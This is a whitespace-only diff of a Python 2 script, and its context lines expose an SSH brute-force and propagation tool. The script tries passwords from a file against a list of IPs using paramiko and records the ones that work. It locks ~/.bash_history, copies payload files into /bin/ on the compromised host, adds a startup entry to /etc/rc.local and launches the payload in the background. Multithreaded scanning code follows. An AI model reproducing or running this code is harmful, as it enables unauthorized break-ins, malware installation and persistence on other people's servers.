@@ -29,7 +29,7 @@ def ssh_connect(ip, password_file):
     timeout = 5
     local_dir = '/root/upload/' 
     remote_dir = '/bin/'
-	
+    
     try:
         with open(password_file, 'r') as f_pw:
             for line in f_pw:
@@ -40,14 +40,14 @@ def ssh_connect(ip, password_file):
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     client.connect(ip, port, username, password, timeout=timeout)
                     print '%s try %s successed' % (ip, password)
-					ssh_password[ip] = password
+                    ssh_password[ip] = password
                     
                     client.exec_command('chmod 444 ~/.bash_history')
                     
                     transport = paramiko.Transport((ip, port))
                     transport.connect(username=username, password=password)
                     sftp = paramiko.SFTPClient.from_transport(transport)
-					
+                    
                     files = os.listdir(local_dir)
                     for upload_file in files:
                         sftp.put(os.path.join(local_dir, upload_file), os.path.join(remote_dir, upload_file))
@@ -55,7 +55,7 @@ def ssh_connect(ip, password_file):
                         client.exec_command('echo "test &" >> /etc/rc.local')
                         client.exec_command('/bin/test > /dev/null 2>&1 &')
                         #client.exec_command('nohup /bin/test > /dev/null 2>&1 &')
-
+                    
                     transport.close()
                     client.close()
                     break
@@ -75,15 +75,15 @@ def create_threads(ip_file, password_file, num_threads):
     ip_reader = threading.Thread(target=read_ip, args=(ip_file,))
     ip_reader.start()
     threads.append(ip_reader)
-	
+    
     for i in range(num_threads):
         worker = threading.Thread(target=scan, args=(password_file,))
         worker.start()
         threads.append(worker)
-		
+    
     for t in threads:
         t.join()
-		
+    
     queue.join()
 
 def main():
